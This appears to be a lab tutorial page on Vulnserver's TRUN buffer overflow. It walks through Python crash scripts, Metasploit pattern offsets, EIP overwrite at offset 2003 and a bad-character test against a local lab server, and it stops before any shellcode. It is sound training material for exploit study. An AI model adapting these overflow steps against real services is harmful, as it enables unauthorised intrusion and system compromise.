---
title: "TRUN EIP Overwrite"
layout: home
permalink: /vulnserver/trun/
collection: vulnserver
sidebar:
  nav: "main"
entries_layout: grid
classes: wide
---

Begin by using the below proof of concept script, developed by using the SPIKE fuzzer to identify a hole in the Vulnserver TRUN command.

Vulnserver TRUN Python Script: POC
```py
#!/usr/bin/python
import socket
import os
import sys

crash="A"*5000

buffer="TRUN /.:/"
buffer+=crash

print "[*] Sending evil TRUN request to VulnServer, OS-42279"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```

Running this POC script against Vulnserver produces the same result in the OllyDbg debugger as our previous SPIKE fuzzing attempts. As a very nice bonus, the input we sent has been used to control the value of a very important register in the CPU – the EIP (Extended Instruction Pointer) register. Notice how the EIP register contains the value 41414141?

![trun-eip-overwrite-media-01](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-01.png)

Additional testing proves that a 2500 byte buffer will also cause the Vulnserver application to crash due to an access violation. Create a 2500 byte patterned string to identify which part of the buffer is being stored in the EIP.
	> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.

Vulnserver TRUN Python Script: Pattern
```py
#!/usr/bin/python
import socket
import os
import sys

crash="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3>

buffer="TRUN /.:/"
buffer+=crash

print "Sending evil TRUN request to VulnServer, OS-42279"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```

Running the Vulnserver TRUN Pattern Python Script against the target system shows that the following pattern value is being stored in EIP.

<!--- <p align="center">
  <img src="/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png">
  </p>
--->

![trun-eip-overwrite-media-02 align="center"](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png)

EIP address is 386F4337. Use the Metasploit pattern offset utility to identify where the bytes are located in the 2500 byte buffer.
	 > /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337

![trun-eip-overwrite-media-03](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-03.png)

An exact match was found at offset 2003 bytes.  Modify the buffer in the POC script to now send 2003 "A" characters, 4 "B" characters, and 1993 "C" characters; this should overwrite EIP with 4 "B" characters while retaining a 4000 byte buffer size.

	Vulnserver TRUN Python Script: Control
		#!/usr/bin/python
		import socket
		import os
		import sys

		crash="A"*2003 + "B"*4 + "C"*1993

		buffer="TRUN /.:/"
		buffer+=crash

		print "[*] Sending evil TRUN request to VulnServer, OS-42279"
		expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
		expl.connect(("192.168.83.128", 9999))
		expl.send(buffer)
		expl.close()

Running the updated script against the Vulnserver crashes the server and produces the following EIP output in OllyDbg.

![trun-eip-overwrite-media-04](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-04.png)

![trun-eip-overwrite-media-05](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-05.png)

The crash buffer has successfully overwritten EIP with four (4) "B" "\x42" characters; we now have control over EIP. The next step is to identify any bad characters the might not work for our shellcode.

Vulnserver TRUN Python Script: Bad Characters
```py
#!/usr/bin/python
import socket
import os
import sys

badchar=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

crash="A"*2003 + "B"*4 + badchar  #"C"*1993

buffer="TRUN /.:/"
buffer+=crash

print "[*] Sending evil TRUN request to VulnServer, OS-42279"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```
![trun-eip-overwrite-media-06](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-06.png)
